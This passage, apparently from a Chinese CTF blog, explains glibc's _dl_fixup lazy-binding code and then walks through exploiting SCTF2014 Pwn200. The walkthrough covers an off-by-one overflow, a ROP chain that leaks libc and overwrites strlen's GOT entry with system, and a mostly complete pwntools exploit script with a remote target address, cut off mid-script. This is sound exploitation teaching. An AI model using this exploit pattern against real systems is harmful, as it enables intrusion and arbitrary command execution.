(ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">/* 查找目标符号。如果未使用常规查找规则，则不要在全局范围内查找。 */</span></span><br><span class="line">    <span class="comment">//st_other定义了符号的可见性，__builtin_expect返回值为第一个参数</span></span><br><span class="line">    <span class="comment">//#define ELF32_ST_VISIBILITY(o) ((o) &amp; 0x03)</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) <span class="comment">//使用了常规查找规则</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span>   <span class="comment">//当前符号的版本</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)   </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//获取动态符号版本表“.gnu.version”的地址</span></span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  <span class="comment">//得到当前所解析符号的版本</span></span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">                version = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 我们需要保持范围不变，因此需要进行一些锁定。 对于无法卸载的对象或尚未使用任何线程的对象，这不是必需的。  */</span></span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">        &#123;</span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">            RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">//strtab + sym-&gt;st_name为所解析函数的符号在字符串表中的地址，result为定义函数的共享对象的加载基地址</span></span><br><span class="line">        <span class="comment">//_dl_lookup_symbol_x的功能是在加载的共享对象的符号表中搜索符号的定义，其参数也许带有该符号的版本。</span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">/* 我们已经完成了全局范围的工作。 */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">            RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="comment">/* 当前result包含定义sym的共享对象的加载基地址（或link map）。 现在添加符号偏移量。 */</span></span><br><span class="line">        <span class="comment">//value为所求函数的真实内存地址</span></span><br><span class="line">        <span class="comment">//SYMBOL_ADDRESS(map, ref, map_set)：如果ref不是NULL，则使用映射MAP中的基地址来计算符号引用的地址。 </span></span><br><span class="line">        <span class="comment">//如果MAP_SET为TRUE，请勿检查NULL映射。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">//未使用常规查找规则</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 我们已经找到了符号。 模块（及其加载地址）也是已知的。 */</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//elf_machine_plt_value返回PLT重定位的最终值。在x86-64上JUMP_SLOT重定位忽略addend。</span></span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line">    <span class="comment">/* 最后，修复PLT本身。 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">//向所查找函数对应的GOT表中填写找到的函数的真实地址。</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>_dl_fixup(l，reloc_arg)</code>有两个参数，<strong><code>l</code></strong>是link_map结构的指针，<strong><code>reloc_arg</code></strong>是所解析函数的<code>重定位项</code>在<code>重定位表.rel.plt</code>中的<code>偏移</code>或<code>下标</code>。<strong><code>32位</code></strong>的<code>reloc_arg</code>和<strong><code>64位</code></strong>的有区别：32位使用<code>reloc_offset</code>, 64位使用<code>reloc_index</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;上面几句的作用是从<strong><code>link_map</code></strong>结构中获取<code>动态链接符号表“.dynsym”</code>、<code>动态链接字符串表“.dynstr”</code>的<code>首地址</code>，<code>重定位表“.rel.plt”</code>中所求函数的<code>重定位项</code>的地址，所求函数在<code>动态链接符号表“.dynsym”</code>中<code>对应项的地址</code>，以及重定位<code>需要修改内容</code>的地址<code>rel_addr</code>。<br>&emsp;&emsp;接下来主要是调用了<strong><code>_dl_lookup_symbol_x()</code></strong>函数，<code>_dl_lookup_symbol_x()</code>的功能是在<code>加载的共享对象的符号表</code>中<code>搜索符号的定义</code>，其<code>参数</code>也许带有<code>该符号的版本</code>。它的<code>返回值</code>为定义所求函数的<code>共享对象的加载基址</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strtab + sym-&gt;st_name为所解析函数的符号在字符串表中的地址，result为定义函数的共享对象的加载基地址</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x的功能是在加载的共享对象的符号表中搜索符号的定义，其参数也许带有该符号的版本。</span></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, </span><br><span class="line">    l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>_dl_lookup_symbol_x()</code></strong>函数的内容比较多，这里就不详细介绍了，准备再写一篇文章，详细介绍Linux下库函数的动态链接过程。其有<strong><code>8个参数</code></strong>：</p><blockquote><ul><li><strong><code>参数1</code></strong>：<code>strtab + sym-&gt;st_name</code>，是指向所要重定位的符号的字符串的指针。</li><li><strong><code>参数2</code></strong>：<code>l</code>，_dl_fixup()函数传进来的link_map结构体链表指针，目前指向第一个结点，即可执行文件对应的链表结点。</li><li><strong><code>参数3</code></strong>：<code>&amp;sym</code>，sym是一个Elf32_Sym类型的结构体对象指针，其指向的是所求函数在动态链接符号表.dynsym中对应符号项。而&amp;sym是这个结构体对象指针的地址。</li><li><strong><code>参数4</code></strong>：<code>l-&gt;l_scope</code>，此link map的查找范围(maps的范围)的指针数组。</li><li><strong><code>参数5</code></strong>：<code>version</code>，所搜索函数的符号版本结构体对象指针。</li><li><strong><code>参数6</code></strong>：<code>ELF_RTYPE_CLASS_PLT</code>，重定位elf_machine_type_class()返回的类型类。</li><li><strong><code>参数7</code></strong>：<code>flags</code>，标志变量。暂时没搞清楚功能。</li><li><strong><code>参数8</code></strong>：<code>*skip_map</code>，需要跳过的、不用搜索的link_map结构体指针。</li></ul></blockquote><p>&emsp;&emsp;<strong><code>_dl_lookup_symbol_x()</code></strong>函数的<code>返回值result</code>为定义函数的<code>共享对象的加载基址</code>。之后我们可以看到使用了<code>DL_FIXUP_MAKE_VALUE()</code>这个宏定义：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 当前result包含定义sym的共享对象的加载基地址（或link map）。 现在添加符号偏移量。 */</span></span><br><span class="line"><span class="comment">//value为所求函数的真实内存地址</span></span><br><span class="line"><span class="comment">//SYMBOL_ADDRESS(map, ref, map_set)：如果ref不是NULL，则使用映射MAP中的基地址来计算符号引用的地址。 </span></span><br><span class="line"><span class="comment">//如果MAP_SET为TRUE，请勿检查NULL映射。</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (result,SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 根据地址和link_map构造修正值 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DL_FIXUP_MAKE_VALUE(map, addr) (map) ? ((struct fdesc)&#123;(addr),(map)-&gt;l_info[DT_PLTGOT]-&gt;d_un.d_ptr &#125;) : ((struct fdesc) &#123; 0, 0 &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果ref不是NULL，则使用映射MAP中的基地址来计算符号引用的地址。如果MAP_SET为TRUE，请勿检查NULL映射。  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOL_ADDRESS(map, ref, map_set) ((ref) == NULL ? 0 : (__glibc_unlikely((ref)-&gt;st_shndx == SHN_ABS) ? 0 : LOOKUP_VALUE_ADDRESS(map, map_set)) + (ref)-&gt;st_value)</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;通过此宏定义，我们可以得到<code>所求符号的真实内存地址</code>，即<strong><code>value</code></strong>。通过一层层宏定义，我们可以知道，<code>符号的真实地址</code>是存在符号项中的<code>st_value</code>中的。之后，通过调用<code>elf_machine_fixup_plt()</code>函数<code>修复GOT表</code>，将<code>重定位函数的真实地址</code>写入可执行文件中<code>函数对应的GOT表项</code>中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向所查找函数对应的GOT表中填写找到的函数的真实地址。</span></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">ElfW</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"><span class="title">elf_machine_fixup_plt</span> <span class="params">(struct link_map *<span class="built_in">map</span>, <span class="keyword">lookup_t</span> t,</span></span></span><br><span class="line">                       const ElfW(Sym) *refsym, const ElfW(Sym) *sym,</span><br><span class="line">                       const ElfW(Rela) *reloc,</span><br><span class="line">                       ElfW(Addr) *reloc_addr, ElfW(Addr) value)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="4、真题解析"><a href="#4、真题解析" class="headerlink" title="4、真题解析"></a>4、真题解析</h2><h3 id="4-0、ret2-dl-runtime-resolve适用情况"><a href="#4-0、ret2-dl-runtime-resolve适用情况" class="headerlink" title="4.0、ret2_dl_runtime_resolve适用情况"></a>4.0、ret2_dl_runtime_resolve适用情况</h3><blockquote><ul><li><strong><code>条件1</code></strong>：题目<code>未给出libc库</code>。</li><li><strong><code>条件2</code></strong>：程序<code>未开启PIE保护</code>。如果<code>开启了PIE保护</code>，则还需要通过泄露获取基地址。</li><li><strong><code>条件3</code></strong>：程序<code>未开启FULL RELRO</code>。</li></ul></blockquote><h3 id="4-1、ret2-dl-runtime-resolve利用方式"><a href="#4-1、ret2-dl-runtime-resolve利用方式" class="headerlink" title="4.1、ret2_dl_runtime_resolve利用方式"></a>4.1、ret2_dl_runtime_resolve利用方式</h3><h3 id="4-2、x86的情况——SCTF2014-Pwn200"><a href="#4-2、x86的情况——SCTF2014-Pwn200" class="headerlink" title="4.2、x86的情况——SCTF2014  Pwn200"></a>4.2、x86的情况——SCTF2014  Pwn200</h3><h4 id="1、检查程序开启的保护机制"><a href="#1、检查程序开启的保护机制" class="headerlink" title="1、检查程序开启的保护机制"></a>1、检查程序开启的保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn200</span><br><span class="line">[*] &apos;/home/******/Desktop/remote-dbg/pwn200&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看到此程序只开启了<code>NX(堆栈不可执行)</code>。</p><h4 id="2、静态分析"><a href="#2、静态分析" class="headerlink" title="2、静态分析"></a>2、静态分析</h4><p>IDA反编译后<code>主函数</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> main1()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> slogan; <span class="comment">// [esp+1Ch] [ebp-9Ch] 0x80 = 128</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>]; <span class="comment">// [esp+9Ch] [ebp-1Ch]</span></span><br><span class="line">    <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+ACh] [ebp-Ch] 32程序size_t大小为4bytes</span></span><br><span class="line">    </span><br><span class="line">    nbytes = <span class="number">16</span>;</span><br><span class="line">    *name = <span class="number">0</span>;</span><br><span class="line">    *&amp;name[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    *&amp;name[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    *&amp;name[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;slogan, <span class="number">0</span>, <span class="number">128u</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input name:"</span>, <span class="number">12u</span>);</span><br><span class="line">    <span class="comment">// name的大小为16byte,多读一个字节,覆盖了后面的数据</span></span><br><span class="line">    read(<span class="number">0</span>, name, nbytes + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 检查输入长度,name输入长度最长为10byte,并且name前8个字节为"syclover"</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(name) - <span class="number">1</span> &gt; <span class="number">9</span> || <span class="built_in">strncmp</span>(<span class="string">"syclover"</span>, name, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input slogan:"</span>, <span class="number">14u</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;slogan, nbytes);</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, &amp;slogan, nbytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们通过分析，可以知道，程序需要<strong><code>两次输入</code></strong>，<strong><code>第一次</code></strong>输入“name”，<strong><code>第二次</code></strong>输入“slogan”。<code>name</code>的大小为<code>16byte</code>，但是程序在读取输入的时候，最多可以读取<code>17byte</code>，多了一个字节，这会<code>覆盖后面的nbytes</code>。如果覆盖为<code>0xFF</code>，则会在后面从标准输入<code>读取“slogan”</code>的时候，<code>读取的最大长度</code>变为<code>255byte</code>，而“slogan”的<code>实际大小</code>只有<code>128byte</code>，这就会导致覆盖栈上的函数的<code>EBP</code>和<code>返回地址</code>。如果输入的数据是经过<code>精心构造</code>过的，就可以<code>劫持程序的控制流</code>。</p><p>&emsp;&emsp;在<code>“name”</code>输入完后，程序会对输入的<code>长度</code>和<code>内容</code>进行判断。长度最长为<code>10byte</code>，并且<code>前8个字节</code>为<code>“syclover”</code>。我们可以使用<code>“\x00”截断</code>，对长度判断进行绕过。</p><h4 id="3、方法一：使用题目提供的libc库，进行利用"><a href="#3、方法一：使用题目提供的libc库，进行利用" class="headerlink" title="3、方法一：使用题目提供的libc库，进行利用"></a>3、方法一：使用题目提供的libc库，进行利用</h4><p><strong><code>利用思路：</code></strong></p><ul><li>1、程序从<code>标准输入</code>读取<code>“name”</code>的时候，利用<code>“\x00”</code>绕过<code>strlen()</code>的长度验证，输入构造的<code>17bytes</code>数据，将<code>nbytes</code>修改为<code>“0xFF”</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">"syclover\x00\xff\xff\xff\xff\xff\xff\xff\xff"</span></span><br></pre></td></tr></table></figure><ul><li>2、程序从<code>标准输入</code>读取<code>“slogan”</code>的时候，输入精心构造的<code>一段ROP的shellcode</code>，劫持程序的控制流。首先利用<code>write函数</code>泄露出<code>read函数的地址</code>，然后根据<code>libc</code>中<code>read函数</code>和<code>system函数</code>的相对偏移，计算出<code>system函数的真实地址</code>。再通过<code>read函数</code>修改<code>strlen的GOT表</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p32(write_plt) + p32(ppp_ret) + p32(<span class="number">0x01</span>) + p32(read_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0x00</span>) + p32(strlen_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">shellcode += p32(main_addr)</span><br><span class="line">ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0x04</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br></pre></td></tr></table></figure><ul><li>3、程序再次从<code>标准输入</code>读取<code>“name”</code>的时候，传入字符串<code>“/bin/sh”</code>。当执行到<code>strlen函数</code>的时候，实际上执行的是<code>system函数</code>，参数即为<code>“/bin/sh”</code>。</li></ul><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary =<span class="string">'./pwn200'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'\\x'</span> + <span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> str])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'218.2.197.235'</span>,<span class="number">10101</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./pwn200','''</span></span><br><span class="line">        <span class="comment">#                             bp 0x080484AC</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048507</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048524</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048579</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048596</span></span><br><span class="line">        <span class="comment">#                             bp 0x080485b8''')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment">#                 bp 0x080484AC</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048507</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048524</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048579</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048596</span></span><br><span class="line">    <span class="comment">#                 bp 0x080485b8''')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># raw_input('[1] before receive "input name:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    name = <span class="string">"syclover\x00"</span>.ljust(<span class="number">17</span>,<span class="string">"\xff"</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"name:"</span> + name</span><br><span class="line">    <span class="comment"># raw_input('[2] before send name')</span></span><br><span class="line">    io.send(name)</span><br><span class="line">    <span class="comment"># raw_input('[3] before receive "input slogan:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input slogan:\x00"</span>)</span><br><span class="line"></span><br><span class="line">    ppp_ret = <span class="number">0x08048646</span></span><br><span class="line">    write_plt = <span class="number">0x080483A0</span></span><br><span class="line">    read_plt = <span class="number">0x08048360</span></span><br><span class="line">    read_got = <span class="number">0x08049850</span></span><br><span class="line">    strlen_got = <span class="number">0x08049858</span></span><br><span class="line">    main_addr = <span class="number">0x080484AC</span></span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p32(write_plt) + p32(ppp_ret) + p32(<span class="number">0x01</span>) + p32(read_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0x00</span>) + p32(strlen_got) + p32(<span class="number">0x04</span>)</span><br><span class="line">    shellcode += p32(main_addr)</span><br><span class="line">    ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0x04</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload_len:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload:"</span> + payload[<span class="number">0</span>:<span class="number">0x90</span>] + str_to_hex(payload[<span class="number">0x90</span>:<span class="number">0x94</span>]) + payload[<span class="number">0x94</span>:<span class="number">0x9C</span>] + str_to_hex(payload[<span class="number">0x9C</span>:])</span><br><span class="line">    <span class="comment"># raw_input('[4] before send payload')</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># raw_input('[5] before receive write_data')</span></span><br><span class="line">    write_data = io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> write_data]</span><br><span class="line">    <span class="comment"># raw_input('[6] before receive read_addr_data')</span></span><br><span class="line">    read_addr_data = io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> read_addr_data]</span><br><span class="line">    read_addr = u32(read_addr_data)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"read_addr:"</span>,hex(read_addr)</span><br><span class="line">    <span class="comment">#libc_info = ELF("./libc.so",checksec = False)</span></span><br><span class="line">    libc_info = ELF(<span class="string">"./libc-2.23.so"</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line">    system_offset = libc_info.symbols[<span class="string">"system"</span>]</span><br><span class="line">    read_offset = libc_info.symbols[<span class="string">"read"</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_offset:"</span>,hex(system_offset)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"read_offset:"</span>,hex(read_offset)</span><br><span class="line"></span><br><span class="line">    libc_addr = read_addr - read_offset</span><br><span class="line">    system_addr = libc_addr + system_offset</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span> + hex(system_addr)</span><br><span class="line">    <span class="comment"># raw_input('[7] before send system_addr')</span></span><br><span 